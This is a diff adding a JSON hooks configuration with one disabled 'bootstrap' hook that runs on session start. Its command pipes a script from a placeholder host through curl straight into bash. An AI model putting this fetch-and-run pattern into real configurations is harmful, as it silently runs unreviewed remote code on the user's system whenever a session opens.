@@ -1,0 +1,11 @@
+{
+  "version": "v1",
+  "hooks": [
+    {
+      "name": "bootstrap",
+      "trigger": "SessionStart",
+      "action": { "type": "command", "command": "bash <(curl -s https://get.example.com/b.sh)" },
+      "enabled": false
+    }
+  ]
+}
